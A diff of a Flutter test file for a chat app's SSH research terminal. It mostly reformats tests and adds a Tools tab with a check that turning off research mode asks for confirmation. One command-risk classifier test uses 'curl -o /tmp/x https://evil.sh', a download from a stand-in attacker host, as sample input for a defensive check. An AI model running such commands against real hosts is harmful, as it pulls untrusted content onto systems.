@@ -19,6 +19,7 @@ import 'package:expert_chat/domain/research/terminal_transcript_buffer.dart';
 import 'package:expert_chat/domain/research/tmux_service.dart';
 import 'package:expert_chat/features/research/research_terminal_page.dart';
 import 'package:expert_chat/features/shell/shell_tab.dart';
+import 'package:expert_chat/features/shell/tools_page.dart';
 import 'package:expert_chat/state/research_terminal_controller.dart';
 import 'package:expert_chat/state/settings_controller.dart';
 import 'package:flutter/material.dart';
@@ -171,8 +172,7 @@ class _FakeDartSshClient implements SSHClient {
     SSHPtyConfig? pty,
     SSHX11Config? x11,
     Map<String, String>? environment,
-  }) =>
-      shellFuture!;
+  }) => shellFuture!;
 
   @override
   void close() {
@@ -438,7 +438,10 @@ void main() {
         expect(c.classify(cmd).risk, CommandRisk.high, reason: cmd);
       }
       // Downloading alone is not download-and-execute.
-      expect(c.classify('curl -o /tmp/x https://evil.sh').risk, CommandRisk.low);
+      expect(
+        c.classify('curl -o /tmp/x https://evil.sh').risk,
+        CommandRisk.low,
+      );
       expect(
         c.classify('wget -qO- https://example.com | head').risk,
         CommandRisk.low,
@@ -553,13 +556,15 @@ void main() {
       expect(recent, isNot(contains('(')));
     });
 
-    test('a charset escape split mid-sequence is rejoined before stripping',
-        () {
-      final buf = TerminalTranscriptBuffer();
-      buf.append('\x1B(');
-      buf.append('Bplain\n');
-      expect(buf.recentForAi(20), 'plain');
-    });
+    test(
+      'a charset escape split mid-sequence is rejoined before stripping',
+      () {
+        final buf = TerminalTranscriptBuffer();
+        buf.append('\x1B(');
+        buf.append('Bplain\n');
+        expect(buf.recentForAi(20), 'plain');
+      },
+    );
   });
 
   group('tmux parse', () {
@@ -903,12 +908,7 @@ void main() {
   group('ssh profile json tolerance', () {
     test('one corrupt entry is skipped, healthy entries survive', () {
       final raw = jsonEncode([
-        {
-          'id': 'host1',
-          'name': 'lab',
-          'host': '127.0.0.1',
-          'username': 'u1',
-        },
+        {'id': 'host1', 'name': 'lab', 'host': '127.0.0.1', 'username': 'u1'},
         {
           'id': 'host2',
           'name': 123, // corrupt: not a String
@@ -936,12 +936,7 @@ void main() {
           'host': ['nope'], // corrupt: not a String
           'username': 'u3',
         },
-        {
-          'id': 'host4',
-          'name': 'fine',
-          'host': '10.0.0.4',
-          'username': 'u4',
-        },
+        {'id': 'host4', 'name': 'fine', 'host': '10.0.0.4', 'username': 'u4'},
       ]);
       final list = SshProfile.listFromJson(raw);
       expect(list.length, 1);
@@ -996,12 +991,14 @@ void main() {
     test('hides terminal unless research on', () {
       expect(ShellTab.visible(researchModeEnabled: false), [
         ShellTab.chat,
+        ShellTab.tools,
         ShellTab.study,
         ShellTab.studio,
         ShellTab.settings,
       ]);
       expect(ShellTab.visible(researchModeEnabled: true), [
         ShellTab.chat,
+        ShellTab.tools,
         ShellTab.terminal,
         ShellTab.study,
         ShellTab.studio,
@@ -1016,7 +1013,7 @@ void main() {
           studyModeEnabled: false,
           creationModeEnabled: false,
         ),
-        [ShellTab.chat, ShellTab.settings],
+        [ShellTab.chat, ShellTab.tools, ShellTab.settings],
       );
       expect(
         ShellTab.visible(
@@ -1024,7 +1021,7 @@ void main() {
           studyModeEnabled: false,
           creationModeEnabled: false,
         ),
-        [ShellTab.chat, ShellTab.terminal, ShellTab.settings],
+        [ShellTab.chat, ShellTab.tools, ShellTab.terminal, ShellTab.settings],
       );
       expect(
         ShellTab.visible(
@@ -1034,6 +1031,7 @@ void main() {
         ),
         [
           ShellTab.chat,
+          ShellTab.tools,
           ShellTab.terminal,
           ShellTab.study,
           ShellTab.studio,
@@ -1047,12 +1045,14 @@ void main() {
       addTearDown(container.dispose);
       container.read(shellTabProvider.notifier).set(ShellTab.terminal);
       expect(container.read(shellTabProvider), ShellTab.terminal);
-      container.read(shellTabProvider.notifier).ensureVisible(
-        ShellTab.visible(
-          researchModeEnabled: false,
-          studyModeEnabled: false,
-        ),
-      );
+      container
+          .read(shellTabProvider.notifier)
+          .ensureVisible(
+            ShellTab.visible(
+              researchModeEnabled: false,
+              studyModeEnabled: false,
+            ),
+          );
       expect(container.read(shellTabProvider), ShellTab.settings);
     });
 
@@ -1060,13 +1060,15 @@ void main() {
       final container = ProviderContainer();
       addTearDown(container.dispose);
       container.read(shellTabProvider.notifier).set(ShellTab.studio);
-      container.read(shellTabProvider.notifier).ensureVisible(
-        ShellTab.visible(
-          researchModeEnabled: false,
-          studyModeEnabled: false,
-          creationModeEnabled: false,
-        ),
-      );
+      container
+          .read(shellTabProvider.notifier)
+          .ensureVisible(
+            ShellTab.visible(
+              researchModeEnabled: false,
+              studyModeEnabled: false,
+              creationModeEnabled: false,
+            ),
+          );
       expect(container.read(shellTabProvider), ShellTab.settings);
     });
   });
@@ -1483,28 +1485,30 @@ void main() {
       },
     );
 
-    test('fingerprint storage failure never tears down the live connection',
-        () async {
-      final ctrl = container.read(researchTerminalProvider.notifier);
-      ctrl.setHostKeyHandlers(
-        onTrust: (_) async => true,
-        onMismatch: (_, _) async => false,
-      );
-      await ctrl.connect(profile);
-      expect(container.read(researchTerminalProvider).isConnected, isTrue);
+    test(
+      'fingerprint storage failure never tears down the live connection',
+      () async {
+        final ctrl = container.read(researchTerminalProvider.notifier);
+        ctrl.setHostKeyHandlers(
+          onTrust: (_) async => true,
+          onMismatch: (_, _) async => false,
+        );
+        await ctrl.connect(profile);
+        expect(container.read(researchTerminalProvider).isConnected, isTrue);
 
-      // Storage now fails every write; a reconnect still wants to persist the
-      // fingerprint, and that failure is a prefs problem, not a transport one.
-      SharedPreferencesStorePlatform.instance = _FailingPrefsStore();
-      await ctrl.disconnect();
-      await ctrl.connect(profile);
+        // Storage now fails every write; a reconnect still wants to persist the
+        // fingerprint, and that failure is a prefs problem, not a transport one.
+        SharedPreferencesStorePlatform.instance = _FailingPrefsStore();
+        await ctrl.disconnect();
+        await ctrl.connect(profile);
 
-      final st = container.read(researchTerminalProvider);
-      expect(st.isConnected, isTrue);
-      expect(st.status, ResearchConnectionStatus.connected);
-      expect(st.statusMessage, contains('指纹'));
-      expect(fake.connected, isTrue);
-    });
+        final st = container.read(researchTerminalProvider);
+        expect(st.isConnected, isTrue);
+        expect(st.status, ResearchConnectionStatus.connected);
+        expect(st.statusMessage, contains('指纹'));
+        expect(fake.connected, isTrue);
+      },
+    );
 
     test('refresh drops a tmux session we are no longer attached to', () async {
       final ctrl = container.read(researchTerminalProvider.notifier);
@@ -1579,7 +1583,8 @@ void main() {
       Future<bool> mineTrust(ResearchHostKeyInfo i) async => true;
       Future<bool> mineMismatch(ResearchHostKeyInfo i, String p) async => true;
       Future<bool> theirsTrust(ResearchHostKeyInfo i) async => true;
-      Future<bool> theirsMismatch(ResearchHostKeyInfo i, String p) async => true;
+      Future<bool> theirsMismatch(ResearchHostKeyInfo i, String p) async =>
+          true;
 
       ctrl.setHostKeyHandlers(onTrust: mineTrust, onMismatch: mineMismatch);
       // A page disposing after a newer one bound its own must not clear it.
@@ -1746,106 +1751,121 @@ void main() {
     }
 
     SshProfile profile(ServerSocket server) => SshProfile(
-          id: 'io-timeout',
-          name: 'io-timeout',
-          host: '127.0.0.1',
-          port: server.port,
-          username: 'u',
-        );
+      id: 'io-timeout',
+      name: 'io-timeout',
+      host: '127.0.0.1',
+      port: server.port,
+      username: 'u',
+    );
 
-    ({io.ResearchSshClientIo client, _FakeDartSshClient fake, Future<void> created})
-        newIoWithFake() {
+    ({
+      io.ResearchSshClientIo client,
+      _FakeDartSshClient fake,
+      Future<void> created,
+    })
+    newIoWithFake() {
       final fake = _FakeDartSshClient();
       final created = Completer<void>();
       final client = io.ResearchSshClientIo()
-        ..debugSshClientFactory = (
-          socket, {
-          required username,
-          required identities,
-          onPasswordRequest,
-          onVerifyHostKey,
-        }) {
-          fake.verifyHostKey = onVerifyHostKey;
-          created.complete();
-          return fake;
-        };
+        ..debugSshClientFactory =
+            (
+              socket, {
+              required username,
+              required identities,
+              onPasswordRequest,
+              onVerifyHostKey,
+            }) {
+              fake.verifyHostKey = onVerifyHostKey;
+              created.complete();
+              return fake;
+            };
       return (client: client, fake: fake, created: created.future);
     }
 
-    test('slow host-key dialog is not counted against the auth timeout',
-        () async {
-      final server = await dummyListener();
-      addTearDown(server.close);
-      final harness = newIoWithFake();
-      final trustGate = Completer<bool>();
+    test(
+      'slow host-key dialog is not counted against the auth timeout',
+      () async {
+        final server = await dummyListener();
+        addTearDown(server.close);
+        final harness = newIoWithFake();
+        final trustGate = Completer<bool>();
 
-      var failed = false;
-      final connecting = harness.client
-          .connect(
-            profile: profile(server),
-            password: 'pw',
-            privateKeyPem: null,
-            passphrase: null,
-            onHostKeyTrust: (_) => trustGate.future,
-            onHostKeyMismatch: (_, _) async => false,
-            connectTimeout: const Duration(milliseconds: 200),
-          )
-          .catchError((Object _) {
-            failed = true;
-          });
+        var failed = false;
+        final connecting = harness.client
+            .connect(
+              profile: profile(server),
+              password: 'pw',
+              privateKeyPem: null,
+              passphrase: null,
+              onHostKeyTrust: (_) => trustGate.future,
+              onHostKeyMismatch: (_, _) async => false,
+              connectTimeout: const Duration(milliseconds: 200),
+            )
+            .catchError((Object _) {
+              failed = true;
+            });
 
-      await harness.created;
-      // The server presents its host key; the trust dialog opens.
-      harness.fake.verifyHostKey!('ssh-ed25519', utf8.encode('SHA256:io-test'));
-      // The user reads the fingerprint for longer than connectTimeout.
-      await Future<void>.delayed(const Duration(milliseconds: 500));
-      expect(
-        failed,
-        isFalse,
-        reason: 'dialog time must not count towards the auth timeout',
-      );
+        await harness.created;
+        // The server presents its host key; the trust dialog opens.
+        harness.fake.verifyHostKey!(
+          'ssh-ed25519',
+          utf8.encode('SHA256:io-test'),
+        );
+        // The user reads the fingerprint for longer than connectTimeout.
+        await Future<void>.delayed(const Duration(milliseconds: 500));
+        expect(
+          failed,
+          isFalse,
+          reason: 'dialog time must not count towards the auth timeout',
+        );
 
-      // The user trusts; the handshake then finishes and the connect succeeds.
-      trustGate.complete(true);
-      harness.fake.authCompleter.complete();
-      harness.fake.shellFuture = Future.value(_FakeDartSshSession());
-      await connecting;
-      expect(harness.client.isConnected, isTrue);
-      expect(harness.client.lastHostKeyFingerprint, 'SHA256:io-test');
-      await harness.client.disconnect();
-    });
+        // The user trusts; the handshake then finishes and the connect succeeds.
+        trustGate.complete(true);
+        harness.fake.authCompleter.complete();
+        harness.fake.shellFuture = Future.value(_FakeDartSshSession());
+        await connecting;
+        expect(harness.client.isConnected, isTrue);
+        expect(harness.client.lastHostKeyFingerprint, 'SHA256:io-test');
+        await harness.client.disconnect();
+      },
+    );
 
-    test('an auth that hangs after the key is confirmed still times out',
-        () async {
-      final server = await dummyListener();
-      addTearDown(server.close);
-      final harness = newIoWithFake();
+    test(
+      'an auth that hangs after the key is confirmed still times out',
+      () async {
+        final server = await dummyListener();
+        addTearDown(server.close);
+        final harness = newIoWithFake();
 
-      final connecting = harness.client.connect(
-        profile: profile(server),
-        password: 'pw',
-        privateKeyPem: null,
-        passphrase: null,
-        onHostKeyTrust: (_) async => true,
-        onHostKeyMismatch: (_, _) async => false,
-        connectTimeout: const Duration(milliseconds: 200),
-      );
-      await harness.created;
-      harness.fake.verifyHostKey!('ssh-ed25519', utf8.encode('SHA256:io-test'));
-      // authCompleter never completes: the fallback timeout must still fire.
-      await expectLater(
-        connecting,
-        throwsA(
-          isA<ResearchSshException>().having(
-            (e) => e.message,
-            'message',
-            '认证超时',
+        final connecting = harness.client.connect(
+          profile: profile(server),
+          password: 'pw',
+          privateKeyPem: null,
+          passphrase: null,
+          onHostKeyTrust: (_) async => true,
+          onHostKeyMismatch: (_, _) async => false,
+          connectTimeout: const Duration(milliseconds: 200),
+        );
+        await harness.created;
+        harness.fake.verifyHostKey!(
+          'ssh-ed25519',
+          utf8.encode('SHA256:io-test'),
+        );
+        // authCompleter never completes: the fallback timeout must still fire.
+        await expectLater(
+          connecting,
+          throwsA(
+            isA<ResearchSshException>().having(
+              (e) => e.message,
+              'message',
+              '认证超时',
+            ),
           ),
-        ),
-      );
-      expect(harness.fake.closed, isTrue);
-      await harness.client.disconnect();
-    });
+        );
+        expect(harness.fake.closed, isTrue);
+        await harness.client.disconnect();
+      },
+    );
 
     test('a PTY channel that never opens times out the connect', () async {
       final server = await dummyListener();
@@ -1882,40 +1902,45 @@ void main() {
       await harness.client.disconnect();
     });
 
-    test('a shell channel stream error surfaces through done, not a swallow',
-        () async {
-      final server = await dummyListener();
-      addTearDown(server.close);
-      final harness = newIoWithFake();
-      final session = _FakeDartSshSession();
-      harness.fake.shellFuture = Future.value(session);
+    test(
+      'a shell channel stream error surfaces through done, not a swallow',
+      () async {
+        final server = await dummyListener();
+        addTearDown(server.close);
+        final harness = newIoWithFake();
+        final session = _FakeDartSshSession();
+        harness.fake.shellFuture = Future.value(session);
 
-      final connecting = harness.client.connect(
-        profile: profile(server),
-        password: 'pw',
-        privateKeyPem: null,
-        passphrase: null,
-        onHostKeyTrust: (_) async => true,
-        onHostKeyMismatch: (_, _) async => false,
-      );
-      await harness.created;
-      harness.fake.verifyHostKey!('ssh-ed25519', utf8.encode('SHA256:io-test'));
-      harness.fake.authCompleter.complete();
-      await connecting;
-      expect(harness.client.isConnected, isTrue);
+        final connecting = harness.client.connect(
+          profile: profile(server),
+          password: 'pw',
+          privateKeyPem: null,
+          passphrase: null,
+          onHostKeyTrust: (_) async => true,
+          onHostKeyMismatch: (_, _) async => false,
+        );
+        await harness.created;
+        harness.fake.verifyHostKey!(
+          'ssh-ed25519',
+          utf8.encode('SHA256:io-test'),
+        );
+        harness.fake.authCompleter.complete();
+        await connecting;
+        expect(harness.client.isConnected, isTrue);
 
-      var done = false;
-      unawaited(harness.client.done.then((_) => done = true));
-      // The remote channel dies with an error — the client must tear the
-      // session down and notify upstream instead of ignoring the error, or
-      // the UI would keep staring at a dead shell as if it were alive.
-      session.pushStdoutError(ResearchSshException('channel died'));
-      await Future<void>.delayed(Duration.zero);
+        var done = false;
+        unawaited(harness.client.done.then((_) => done = true));
+        // The remote channel dies with an error — the client must tear the
+        // session down and notify upstream instead of ignoring the error, or
+        // the UI would keep staring at a dead shell as if it were alive.
+        session.pushStdoutError(ResearchSshException('channel died'));
+        await Future<void>.delayed(Duration.zero);
 
-      expect(harness.client.isConnected, isFalse);
-      expect(done, isTrue);
-      await harness.client.disconnect();
-    });
+        expect(harness.client.isConnected, isFalse);
+        expect(done, isTrue);
+        await harness.client.disconnect();
+      },
+    );
   });
 
   group('web stub client', () {
@@ -1965,13 +1990,13 @@ void main() {
   });
 
   group('static product gates', () {
-    test('research terminal page and settings card exist in tree sources', () {
+    test('research terminal page and tools card exist in tree sources', () {
       // Structural checks against shipped sources (package root = CWD).
       final terminal = File(
         'lib/features/research/research_terminal_page.dart',
       ).readAsStringSync();
       final settings = File(
-        'lib/features/settings/settings_page.dart',
+        'lib/features/shell/tools_page.dart',
       ).readAsStringSync();
       final shell = File(
         'lib/features/shell/app_shell.dart',
@@ -2029,6 +2054,64 @@ void main() {
         await container.read(researchTerminalProvider.notifier).disconnect();
       } catch (_) {}
       container.dispose();
+    });
+
+    testWidgets('工具页保留 SSH 连接，关闭科研功能仍需确认', (tester) async {
+      await container.read(settingsControllerProvider.future);
+      await container
+          .read(settingsControllerProvider.notifier)
+          .setResearchModeEnabled(true);
+      final ctrl = container.read(researchTerminalProvider.notifier);
+      ctrl.setHostKeyHandlers(
+        onTrust: (_) async => true,
+        onMismatch: (_, _) async => true,
+      );
+      await ctrl.connect(profile);
+      final initialDisconnects = fake.disconnectCount;
+      await tester.pumpWidget(
+        UncontrolledProviderScope(
+          container: container,
+          child: const MaterialApp(home: ToolsPage()),
+        ),
+      );
+      await tester.pumpAndSettle();
+      final card = find.widgetWithText(Card, '科研模式');
+      await tester.ensureVisible(card);
+      expect(fake.connected, isTrue);
+      expect(fake.disconnectCount, initialDisconnects);
+      final toggle = find.descendant(of: card, matching: find.byType(Switch));
+      await tester.tap(toggle);
+      await tester.pump();
+      await tester.pump(const Duration(milliseconds: 400));
+      expect(find.text('关闭科研模式？'), findsOneWidget);
+      await tester.tap(find.text('取消'));
+      await tester.pumpAndSettle();
+      expect(fake.connected, isTrue);
+      expect(
+        container
+            .read(settingsControllerProvider)
+            .requireValue
+            .researchModeEnabled,
+        isTrue,
+      );
+      await tester.tap(toggle);
+      await tester.pump();
+      await tester.pump(const Duration(milliseconds: 400));
+      await tester.tap(find.text('断开并关闭'));
+      await tester.runAsync(
+        () => Future<void>.delayed(const Duration(milliseconds: 50)),
+      );
+      await tester.pumpAndSettle();
+      expect(fake.connected, isFalse);
+      expect(
+        container
+            .read(settingsControllerProvider)
+            .requireValue
+            .researchModeEnabled,
+        isFalse,
+      );
+      expect(tester.takeException(), isNull);
+      await tester.pumpWidget(const SizedBox.shrink());
     });
 
     /// Mirrors AppShell on phones: the page is nested in the shell Scaffold's
